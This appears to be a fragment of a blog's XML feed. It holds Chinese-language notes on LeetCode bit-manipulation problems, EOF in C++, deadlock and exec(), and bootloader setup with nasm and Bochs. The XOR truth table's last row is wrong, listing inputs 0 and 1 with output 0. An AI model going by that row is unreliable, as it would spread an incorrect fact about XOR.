]]></content>
      
        <categories>
            
            <category> Algorithm </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[268. Missing Number]]></title>
      <url>/wiki/2017/08/17/Leetcode-268-Missing-Number/</url>
      <content type="html"><![CDATA[<p>Given an array containing $n$ distinct numbers taken from <code>0, 1, 2, ..., n</code>, find the one that is missing from the array.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,0,1]</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [9,6,4,2,3,5,7,0,1]</span><br><span class="line">Output: 8</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:<br>Your algorithm should run in linear runtime complexity. Could you implement it using only constant extra space complexity?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>题目给定的数列的范围是$0\sim n$，由于$n$是已知的(<code>n=nums.length</code>)，所以数列的和也是已知的。那么把给定数组加起来得到总和，减小的部分就是缺失的数字。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) sum += num;</span><br><span class="line">    <span class="keyword">return</span> n*(n + <span class="number">1</span>)/<span class="number">2</span> - sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一种好的方法是使用位操作。原本一共有$n+1$个数字<code>0, 1, 2, ..., n</code>。数组一共有$n$个数，数组的下标也有$n$个数。如果数组是全的话(有$n+1$个数字)，数组中的数字和下表按位异或的结果应该等于0。现在缺失一个数字，那么按位异或的结果肯定就等于缺失的数字。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    res ^= n; <span class="comment">// 异或数组下标n</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        res ^= i ^ nums[i]; <span class="comment">// 异或数组下标和数组中的数</span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Bit Manipulation </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[136 Single Number]]></title>
      <url>/wiki/2017/08/17/Leetcode-136-Single-Number/</url>
      <content type="html"><![CDATA[<h2 id="136-Single-Number"><a href="#136-Single-Number" class="headerlink" title="136. Single Number"></a>136. Single Number</h2><p>Given a <strong>non-empty</strong> array of integers, every element appears <em>twice</em> except for one. Find that single one.</p>
<p><strong>Note</strong>:</p>
<p>Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,2,1]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [4,1,2,1,2]</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目涉及位操作。<code>^</code>(<code>xor</code>, 异或):  当两个位不同时，输出true/1。异或的真值表：</p>
<table>
<thead>
<tr>
<th>A</th>
<th>B</th>
<th>Output</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>所以对于整数来说：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> ^ <span class="number">0</span> = <span class="number">0</span> </span><br><span class="line">n ^ <span class="number">0</span> = n </span><br><span class="line">n ^ n = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>如果把题目中的所有整数接连异或，由于出现两次的数字异或结果为0，最后剩下的就是出现一次的数字。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums)</span><br><span class="line">        res ^= num;</span><br><span class="line">    <span class="keyword">return</span> res; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            n = n^num</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[260. Single Number III]]></title>
      <url>/wiki/2017/08/17/Leetcode-260-Single-Number-III/</url>
      <content type="html"><![CDATA[<p>Given an array of numbers <code>nums</code>, in which exactly two elements appear only once and all the other elements appear exactly twice. Find the two elements that appear only once.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input:  [1,2,1,3,2,5]</span><br><span class="line">Output: [3,5]</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<ol>
<li>The order of the result is not important. So in the above example, <code>[5, 3]</code> is also correct.</li>
<li>Your algorithm should run in linear runtime complexity. Could you implement it using only constant space complexity?</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[137 Single Number II]]></title>
      <url>/wiki/2017/08/17/Leetcode-137-Single-Number-II/</url>
      <content type="html"><![CDATA[<p>Given a <strong>non-empty</strong> array of integers, every element appears <em>three</em> times except for one, which appears exactly once. Find that single one.</p>
<p><strong>Note</strong>:<br>Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,2,3,2]</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,1,0,1,0,1,99]</span><br><span class="line">Output: 99</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 136 Single Number的扩展。其实LeetCode 136可以看成是这道题目的特例。为什么这么说呢？因为有一种通用的方法可以去除出现$n$次的整数。该方法使用位操作，具体来说就是如果整数出现$n$次，那么二进制表示的第$i$位数也出现$n$次，将第$i$位数加起来取$n$的余数肯定是0。用伪代码表示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (num : nums)</span><br><span class="line">    res += (num &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">assert</span> res % n == <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>那么如果把出现一次的那个数字也算上，第$i$位数加起来取$n$的余数肯定等于出现一次的数字第$i$位数。将每一位上的数合起来(|，按位或)，即得到那个数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumberII</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> single = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> iBit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums)</span><br><span class="line">            iBit += (num &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">        single |= (iBit % <span class="number">3</span>) &lt;&lt; i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> single;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还有1中解法，比较好的解释在<a href="https://leetcode.com/problems/single-number-ii/discuss/43302/Accepted-code-with-proper-Explaination.-Does-anyone-have-a-better-idea">这里</a></p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[EOF]]></title>
      <url>/wiki/2017/08/17/C-EOF/</url>
      <content type="html"><![CDATA[<p>In computing, <code>end-of-file</code> (commonly abbreviated <code>EOF</code>) is a condition in a computer operating system <em>where no more data can be read from a data source</em>. The data source is usually called a file or stream.</p>
<p>EOF在Unix系统上对应的是<code>Control-D</code>，在Windows上是<code>Control-Z</code>。</p>
<p>例如下面输入2个数字的C++程序<code>test.cpp</code>:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x, y;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y )</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">'/'</span> &lt;&lt; x &lt;&lt; <span class="string">'/'</span> &lt;&lt; y &lt;&lt; <span class="string">"/\n"</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">cin</span>.eof() )</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"End of input\n"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"There was an error\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在输入两个字符<code>5 6</code>之后，打印出<code>/5/6/</code>，然后在键入<code>ctrl-D</code>即<code>EOF</code>，程序输出”End of input”，否则输出”There was an error”。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$./<span class="built_in">test</span></span><br><span class="line">5 6</span><br><span class="line">/5/6/</span><br><span class="line">End of input</span><br><span class="line">$./<span class="built_in">test</span></span><br><span class="line">5 6</span><br><span class="line">/5/6/</span><br><span class="line">a</span><br><span class="line">There was an error</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> C++ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Deadlock and exec]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-6-Deaklock-and-exec/</url>
      <content type="html"><![CDATA[<h2 id="Locking-Multiple-Resources"><a href="#Locking-Multiple-Resources" class="headerlink" title="Locking Multiple Resources"></a>Locking Multiple Resources</h2><ul>
<li><strong>Locks</strong> protect access to shared resources.</li>
<li>Threads may need <strong>multiple</strong> shared resources to perform some operation.</li>
</ul>
<p>Consider two threads A and B that both need <strong>simultaneous</strong> access to resources 1 and 2:</p>
<ol>
<li><strong>Thread A</strong> runs, grabs the lock for <strong>Resource 1</strong>.</li>
<li>→ CONTEXT SWITCH ←</li>
<li><strong>Thread B</strong> runs, grabs the lock for <strong>Resource 2</strong>.</li>
<li>→ CONTEXT SWITCH ←</li>
<li><strong>Thread A</strong> runs, tries to acquire the lock for <strong>Resource 2</strong>.</li>
<li>→ THREAD A SLEEPS ←</li>
<li><strong>Thread B</strong> runs, tries to acquire the lock for <strong>Resource 1</strong>.</li>
<li>→ THREAD B SLEEPS ←</li>
</ol>
<p>Now what?</p>
<h2 id="Deadlock"><a href="#Deadlock" class="headerlink" title="Deadlock"></a>Deadlock</h2><p><strong>Deadlock</strong>(死锁) occurs when a thread or set of threads are waiting for each other to finish and thus nobody ever does.</p>
<h2 id="Self-Deadlock"><a href="#Self-Deadlock" class="headerlink" title="Self Deadlock"></a>Self Deadlock</h2><p>A <strong>single thread</strong> can deadlock. How?</p>
<ul>
<li>Thread A acquires Resource 1. Thread A tries to reacquire Resource 1.</li>
</ul>
<p>This seems inane. Why would this happen?</p>
<ul>
<li><code>foo()</code> needs Resource 1. <code>bar()</code> needs Resource 1. While locking Resource 1 <code>foo()</code> calls <code>bar()</code>.</li>
</ul>
<p>Can we solve this problem?</p>
<ul>
<li>Yes! <strong>Recursive</strong> locks. Allow a thread to reacquire a lock that it already holds, as long as calls to acquire are matched by calls to release.</li>
<li>This kind of problem is not uncommon. You may want to implement recursive locks for OS/161.</li>
<li>(But don’t make the locks we gave you suddenly recursive…​)</li>
</ul>
<h2 id="Conditions-for-Deadlock"><a href="#Conditions-for-Deadlock" class="headerlink" title="Conditions for Deadlock"></a>Conditions for Deadlock</h2><p>A deadlock <strong>cannot occur</strong> <em>unless</em> all of the following conditions are met:</p>
<ul>
<li><strong>Protected access</strong> to shared resources, which implies waiting.</li>
<li><strong>No resource preemption</strong>, meaning that the system cannot forcibly take a resource from a thread holding it.</li>
<li><strong>Multiple independent requests</strong>, meaning a thread can hold some resources while requesting others.</li>
<li><strong>Circular dependency graph</strong>, meaning that Thread A is waiting for Thread B which is waiting for Thread C which is waiting for Thread D which is waiting for Thread A.</li>
</ul>
<h2 id="Dining-Philosophers"><a href="#Dining-Philosophers" class="headerlink" title="Dining Philosophers"></a>Dining Philosophers</h2><ul>
<li><p>“Classic” synchronization problem which I feel obligated to discuss.</p>
</li>
<li><p>Illustrated below.</p>
</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/dining philosophers.png" alt="dining philosophers"></p>
<p><a href="https://en.wikipedia.org/wiki/Dining_philosophers_problem">wiki</a></p>
<h2 id="Feeding-Philosophers"><a href="#Feeding-Philosophers" class="headerlink" title="Feeding Philosophers"></a>Feeding Philosophers</h2><p>Breaking deadlock conditions usually requires eliminating one of the <strong>requirements</strong> for deadlock.</p>
<ul>
<li><strong>Don’t wait</strong>: don’t sleep if you can’t grab the second chopstick and put down the first.</li>
<li><strong>Break cycles</strong>: usually by acquiring resources in a <strong>well-defined order</strong>. Number chopsticks 0–4, always grab the higher-numbered chopstick first.</li>
<li><strong>Break out</strong>: detect the deadlock cycle and forcibly take away a resource from a thread to break it. (Requires a new mechanism.)</li>
<li><strong>Don’t make multiple independent requests</strong>: grab <strong>both</strong> chopsticks at once. (Requires a new mechanism.)</li>
</ul>
<h2 id="Deadlock-v-Starvation"><a href="#Deadlock-v-Starvation" class="headerlink" title="Deadlock v. Starvation"></a>Deadlock v. Starvation</h2><p><strong>Starvation</strong>(饥饿) is an equally-problematic condition in which one or more threads do not make progress.</p>
<ul>
<li>Starvation differs from deadlock in that <strong>some</strong> threads make progress and it is, in fact, those threads that are preventing the “starving” threads from proceeding.</li>
</ul>
<h2 id="Deadlock-v-Race-Conditions"><a href="#Deadlock-v-Race-Conditions" class="headerlink" title="Deadlock v. Race Conditions"></a>Deadlock v. Race Conditions</h2><p>What is better: a deadlock (perhaps from overly careful synchronization) or a race condition (perhaps from a lack of correct synchronization)?</p>
<p>I’ll take the deadlock. <strong>It’s much easier to detect!</strong></p>
<h2 id="Using-the-Right-Tool"><a href="#Using-the-Right-Tool" class="headerlink" title="Using the Right Tool"></a>Using the Right Tool</h2><ul>
<li>Most problems can be solved with a <strong>variety</strong> of synchronization primitives.</li>
<li>However, there is usually <strong>one primitive</strong> that is more appropriate than the others.</li>
<li>You will have a chance to practice picking synchronization primitives for ASST1, and throughout the class.</li>
</ul>
<h2 id="Approaching-Synchronization-Problems"><a href="#Approaching-Synchronization-Problems" class="headerlink" title="Approaching Synchronization Problems"></a>Approaching Synchronization Problems</h2><ol>
<li>Identify the constraints.</li>
<li>Identify shared state.</li>
<li>Choose a primitive.</li>
<li>Pair waking and sleeping.</li>
<li>Look out for multiple resource allocations: can lead to deadlock.</li>
<li>Walk through simple examples and corner cases before beginning to code.</li>
</ol>
<h2 id="wait-1-Process-lifecycle"><a href="#wait-1-Process-lifecycle" class="headerlink" title="$ wait %1 # Process lifecycle"></a>$ wait %1 # Process lifecycle</h2><ul>
<li>Change: <code>exec()</code></li>
<li>Death: <code>exit()</code></li>
<li>The Afterlife: <code>wait()</code></li>
</ul>
<h2 id="Groundhog-Day"><a href="#Groundhog-Day" class="headerlink" title="Groundhog Day"></a>Groundhog Day</h2><p>Is <code>fork()</code> enough?</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/fork(" alt="fork--">.png)</p>
<h2 id="Change-exec"><a href="#Change-exec" class="headerlink" title="Change: exec()"></a>Change: exec()</h2><ul>
<li>The <code>exec()</code> family of system calls replaces the calling process with a new process loaded from a file.</li>
<li>The executable file must contain a complete <strong>blueprint</strong> indicating how the address space should look when <code>exec()</code> completes.<ul>
<li>What should the contents of memory be?</li>
<li>Where should the first thread start executing?</li>
</ul>
</li>
<li>Linux and other UNIX-like systems use <strong>ELF</strong> (Executable and Linkable Format) as the standard describing the information in the executable file is structured.</li>
</ul>
<h2 id="readelf-display-ELF-information"><a href="#readelf-display-ELF-information" class="headerlink" title="$ readelf # display ELF information"></a>$ readelf # display ELF information</h2><p><img src="http://or9a8nskt.bkt.clouddn.com/readlf.png" alt="readlf"></p>
<h2 id="lib-ld-linux-so-2"><a href="#lib-ld-linux-so-2" class="headerlink" title="$ /lib/ld-linux.so.2"></a>$ /lib/ld-linux.so.2</h2><p><img src="http://or9a8nskt.bkt.clouddn.com/ldlinux.png" alt="ldlinux"></p>
<h2 id="exec-Argument-Passing"><a href="#exec-Argument-Passing" class="headerlink" title="exec() Argument Passing"></a>exec() Argument Passing</h2><ul>
<li>The process calling <code>exec()</code> passes arguments to the process that will replace it <strong>through the kernel</strong>.<ul>
<li>The kernel retrieves the arguments from the process after the call to <code>exec()</code> is made.</li>
<li>It then pushes them in to the memory of the process where the replacement process can find them when it starts executing.<ul>
<li>This is where main gets <em>argc</em> and <em>argv</em>!</li>
</ul>
</li>
</ul>
</li>
<li><code>exec()</code> also has an interesting return, almost the dual of <code>fork()</code>: <code>exec()</code> never returns!</li>
</ul>
<h2 id="exec"><a href="#exec" class="headerlink" title="$exec()"></a>$exec()</h2><p><img src="http://or9a8nskt.bkt.clouddn.com/exec1.png" alt="exec1"><br><img src="http://or9a8nskt.bkt.clouddn.com/exec2.png" alt="exec2"><br><img src="http://or9a8nskt.bkt.clouddn.com/exec3.png" alt="exec3"><br><img src="http://or9a8nskt.bkt.clouddn.com/exec4.png" alt="exec4"><br><img src="http://or9a8nskt.bkt.clouddn.com/exec5.png" alt="exec5"><br><img src="http://or9a8nskt.bkt.clouddn.com/exec6.png" alt="exec6"><br><img src="http://or9a8nskt.bkt.clouddn.com/exec7.png" alt="exec7"></p>
<h2 id="exec-File-Handle-Semantics"><a href="#exec-File-Handle-Semantics" class="headerlink" title="exec() File Handle Semantics"></a>exec() File Handle Semantics</h2><ul>
<li>By convention exec does <strong>not</strong> modify the file table of the calling process! Why not?</li>
<li>Remember <strong>pipes</strong>?<ul>
<li>Don’t undo all the hard work that <code>fork()</code> put in to duplicating the file table!<br><img src="http://or9a8nskt.bkt.clouddn.com/pipesexample3.png" alt="pipes example 3"></li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[C++ Primer (6) - 函数]]></title>
      <url>/wiki/2017/07/30/C-C-Primer-6-%E5%87%BD%E6%95%B0C-Primer-12-%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98/</url>
      <content type="html"><![CDATA[<h2 id="6-1函数基础"><a href="#6-1函数基础" class="headerlink" title="6.1函数基础"></a>6.1函数基础</h2><h2 id="6-2参数传递"><a href="#6-2参数传递" class="headerlink" title="6.2参数传递"></a>6.2参数传递</h2><p>形参(parameter)的类型决定了形参和实参(argument)交换的方式：</p>
<ul>
<li><strong>引用传递</strong>(passed by reference)：如果形参是引用类型(即&amp;)，它将绑定到对应的实参上；</li>
<li><strong>值传递</strong>(passed by value)：否则，将实参的值拷贝后赋给形参。</li>
</ul>
<h2 id="6-3返回类型和return语句"><a href="#6-3返回类型和return语句" class="headerlink" title="6.3返回类型和return语句"></a>6.3返回类型和return语句</h2><h2 id="6-4函数重载"><a href="#6-4函数重载" class="headerlink" title="6.4函数重载"></a>6.4函数重载</h2><h2 id="6-7函数指针"><a href="#6-7函数指针" class="headerlink" title="6.7函数指针"></a>6.7函数指针</h2>]]></content>
      
        <categories>
            
            <category> C++ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Memory </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[实现操作系统1 - 配置]]></title>
      <url>/wiki/2017/07/30/OS-%E5%AE%9E%E7%8E%B0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F1-%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h2 id="工作环境"><a href="#工作环境" class="headerlink" title="工作环境"></a>工作环境</h2><h3 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h3><p><code>nasm</code>是开源的汇编语言编译程序。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nasm</span><br></pre></td></tr></table></figure>
<p>编写文档<code>boot.asm</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">	org	07c00h			; where the code will be running</span><br><span class="line">	mov	ax, cs</span><br><span class="line">	mov	ds, ax</span><br><span class="line">	mov	es, ax</span><br><span class="line">	call	DispStr			; let&apos;s display a string</span><br><span class="line">	jmp	$			; and loop forever</span><br><span class="line">DispStr:</span><br><span class="line">	mov	ax, BootMessage</span><br><span class="line">	mov	bp, ax			; ES:BP = string address</span><br><span class="line">	mov	cx, 16			; CX = string length</span><br><span class="line">	mov	ax, 01301h		; AH = 13,  AL = 01h</span><br><span class="line">	mov	bx, 000ch		; RED/BLACK</span><br><span class="line">	mov	dl, 0</span><br><span class="line">	int	10h</span><br><span class="line">	ret</span><br><span class="line">BootMessage:		db	&quot;Hello, OS world!&quot;</span><br><span class="line">times 	510-($-$$)	db	0	; fill zeros to make it exactly 512 bytes</span><br><span class="line">dw 	0xaa55				; boot record signature</span><br></pre></td></tr></table></figure>
<p>用nasm编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm boot.asm -o boot.bin</span><br></pre></td></tr></table></figure>
<p>将引导扇区<code>boot.bin</code>写入软盘</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=boot.bin of=boot.img bs=512 count=1 conv=notrunc</span><br></pre></td></tr></table></figure>
<h3 id="bochs"><a href="#bochs" class="headerlink" title="bochs"></a>bochs</h3><p><a href="http://bochs.sourceforge.net"><code>Bochs</code></a>是一个x86硬件平台的开源模拟器。它可以模拟各种硬件的配置。Bochs模拟的是整个PC平台，包括I/O设备、内存和BIOS。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install bochs</span><br></pre></td></tr></table></figure>
<p>拷贝配置样本到当前目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/<span class="built_in">local</span>/Cellar/bochs/2.6.9_2/share/doc/bochs/bochsrc-sample.txt .</span><br></pre></td></tr></table></figure>
<p>然后正确配置里面的选项。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">############################################################### </span></span><br><span class="line"><span class="comment"># Configuration file for Bochs（Mac） </span></span><br><span class="line"><span class="comment">###############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filename of ROM images </span></span><br><span class="line">romimage: file=<span class="variable">$BXSHARE</span>/BIOS-bochs-latest </span><br><span class="line"></span><br><span class="line"><span class="comment"># VGAROMIMAGE</span></span><br><span class="line"><span class="comment"># You now need to load a VGA ROM BIOS into C0000.</span></span><br><span class="line">vgaromimage: file=<span class="variable">$BXSHARE</span>/VGABIOS-lgpl-latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># what disk images will be used </span></span><br><span 